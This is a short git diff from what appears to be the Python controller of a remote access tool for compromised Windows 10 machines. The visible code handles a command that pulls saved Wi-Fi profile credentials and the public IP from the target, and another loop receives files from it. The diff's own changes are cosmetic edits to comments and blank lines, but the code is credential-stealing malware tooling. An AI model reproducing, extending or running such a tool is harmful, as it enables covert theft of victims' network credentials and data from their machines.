@@ -274,14 +274,14 @@ spoof_wanip                   :    Spoofs public/wan ip of the trgt machine
 
 			getting_wanip()
 
-		# spoofing wlan profile creds and wan/public ip from trgt win10 machine
+		# spoofing wlan profile creds and wan/public ip from trgt win10 machine   ✓
 		elif cmd[:16] == "spoof_wlan_creds" and len(cmd) > 1:
 
 			# Getting wan ip
 			getting_wanip()
 			print("")
 
-			# Getting wifi profile creds list from trgt
+			# Getting wifi profile creds list from trgt 
 			list_profiles = recv_eff() # it is a list which contians lists
 
 			# looping through lists
@@ -381,7 +381,6 @@ spoof_wanip                   :    Spoofs public/wan ip of the trgt machine
 			trgt.settimeout(None)
 			file.close()
 			counter += 1
-
 
 
 		# list files in host's pwd directory  ✓
